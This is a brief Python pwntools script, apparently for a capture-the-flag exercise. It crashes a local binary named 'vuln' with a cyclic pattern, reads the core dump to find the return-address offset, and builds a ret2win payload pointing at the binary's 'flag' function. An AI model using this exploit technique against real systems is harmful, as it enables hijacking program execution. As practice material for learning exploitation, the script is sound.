#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object

p = process(elf.path)        # references elf object
p.sendline(cyclic(200))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('/mnt/wslg/dumps/core.vuln')    # parse core dump file
print(cyclic_find(core.rip))
payload = flat({
    cyclic_find(core.rip): elf.symbols.flag    # offset:address
})

print(payload)

